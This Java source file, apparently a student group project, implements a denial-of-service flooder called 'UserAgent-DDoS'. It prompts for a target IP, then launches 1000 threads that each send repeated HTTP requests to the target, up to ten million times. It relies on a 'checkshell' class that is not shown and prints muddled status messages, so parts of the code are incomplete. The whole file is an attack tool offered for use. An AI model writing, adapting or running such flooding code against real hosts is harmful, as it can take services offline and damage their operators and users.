/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos;

/**
 *
 * @author Luis Martínez/David Discua / Horacio Galdamez / Denisse Carvajal / Emerson Velasquez
 */
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.Scanner;

/**
 * 
 */
public class dos extends Socket implements Runnable {

    static dos _instance = new dos();
    static String eingabe = "";

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Please Enter Ip to UserAgent-DDoS : ");
        eingabe = scanner.nextLine();
        for (int i = 0; i < 1000; i++) {
            new Thread(_instance).start();
        }
    }

    public void run() {

        String TARGET = eingabe;
        if (eingabe == null || eingabe.length() == 0) {
            System.out.println("range");
        }

        for (int i = 1; i < 10000000; i++) {
            if ((checkshell.exists("http://" + TARGET + "")) == true) {
                System.out.println("" + i + " Times with " + i + " Connection");
            } else if ((checkshell.exists("http://" + TARGET + "")) == false) {
                System.out.println("Success" + i + " Connection !!!");
            }

        }
    }

    public static void sendRawLine(String text, Socket sock) {
        try {
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
            out.write(text + " ");
            out.flush();
        } catch (IOException ex) {
            System.out.println("Offline Aquí...");
            //ex.printStackTrace();
        }
    }
}